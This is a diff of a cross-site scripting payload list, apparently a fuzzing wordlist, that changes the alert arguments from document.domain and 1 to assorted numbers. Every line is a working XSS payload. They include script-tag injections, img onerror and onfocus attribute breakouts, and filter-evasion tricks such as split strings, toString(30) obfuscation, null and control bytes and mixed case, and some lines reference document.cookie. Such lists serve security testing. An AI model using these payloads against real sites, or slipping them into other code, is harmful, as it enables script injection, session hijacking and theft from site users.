@@ -1,50 +1,50 @@
-<script>alert(document.domain)</script>
+<script>alert(654)</script>
 alert(1)
-"><script>alert(document.domain)</script>
-<img src=x onerror=alert('test12')>
-" autofocus onfocus="alert(document.domain)
+"><script>alert(1001)</script>
+<img src=x onerror=alert('test122')>
+" autofocus onfocus="alert(009)
 &lt;img src=x onerror=alert(&#39;test&#39;)&gt;
-"autofocus/onfocus="alert(document.domain)
+"autofocus/onfocus="alert(0032)
 "autofocus/onfocus="confirm&#40;document.domain&#41;
-'-alert(document.domain)-'
-alert(document.cookie)
-\'-alert(document.domain);<!--
-\'-alert(document.domain);//
-" autofocus="" onfocus="alert(document.domain)
-"};this[8680439..toString(30)](document.domain);//
-"};this[8680439..toString(30)](document.domain);{"
-'};this[8680439..toString(30)](document.domain);{'
-';this[8680439..toString(30)](document.domain);//'
-x';x=top["al"%2B"ert"](document.domain);//
-x';x=this["al"%2B"ert"](document.domain);//
-#<script>alert(document.domain)</script>
+'-alert(1112)-'
+alert(001)
+\'-alert(675);<!--
+\'-alert(985);//
+" autofocus="" onfocus="alert(1007)
+"};this[8680439..toString(30)](652);//
+"};this[8680439..toString(30)](100);{"
+'};this[8680439..toString(30)](621);{'
+';this[8680439..toString(30)](000);//'
+x';x=top["al"%2B"ert"](095);//
+x';x=this["al"%2B"ert"](052);//
+#<script>alert(115)</script>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-<div/style="width:expression(confirm(1))">X</div> {IE7}
-<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<div/style="width:expression(confirm(12))">X</div> {IE7}
+<iframe/%00/ src=javaSCRIPT&colon;alert(1033)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-<img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x11src=x onerror="javascript:alert(1)">
-<img \x12src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x10src=x onerror="javascript:alert(1)">
-<img\x13src=x onerror="javascript:alert(1)">
-<img\x32src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x11src=x onerror="javascript:alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x34src=x onerror="javascript:alert(1)">
-<img \x39src=x onerror="javascript:alert(1)">
-<img \x00src=x onerror="javascript:alert(1)">
-<img src\x09=x onerror="javascript:alert(1)">
-<img src\x10=x onerror="javascript:alert(1)">
-<img src\x13=x onerror="javascript:alert(1)">
-<sCriPt>alert('jon200')</sCriPt>
-<img src\x12=x onerror="javascript:alert(1)">
-<img src\x11=x onerror="javascript:alert(1)">
-<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
-<img src\x47=x onerror="javascript:alert(1)">
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
-<img src=x\x10onerror="javascript:alert(1)">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(102) /*iframe/src*/>
+<img \x00src=x onerror="alert(777)">
+<img \x47src=x onerror="javascript:alert(188)">
+<img \x11src=x onerror="javascript:alert(175)">
+<img \x12src=x onerror="javascript:alert(110)">
+<img\x47src=x onerror="javascript:alert(187)">
+<img\x10src=x onerror="javascript:alert(211)">
+<img\x13src=x onerror="javascript:alert(311)">
+<img\x32src=x onerror="javascript:alert(167)">
+<img\x47src=x onerror="javascript:alert(971)">
+<img\x11src=x onerror="javascript:alert(671)">
+<img \x47src=x onerror="javascript:alert(541)">
+<img \x34src=x onerror="javascript:alert(671)">
+<img \x39src=x onerror="javascript:alert(971)">
+<img \x00src=x onerror="javascript:alert(761)">
+<img src\x09=x onerror="javascript:alert(001)">
+<img src\x10=x onerror="javascript:alert(861)">
+<img src\x13=x onerror="javascript:alert(781)">
+<sCriPt>alert('jon2030')</sCriPt>
+<img src\x12=x onerror="javascript:alert(061)">
+<img src\x11=x onerror="javascript:alert(541)">
+<svg><style>{font-family&colon;'<iframe/onload=confirm(321)>'
+<img src\x47=x onerror="javascript:alert(961)">
+<iframe %00 src="&Tab;javascript:prompt(751)&Tab;"%00>
+<img src=x\x10onerror="javascript:alert(211)">
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
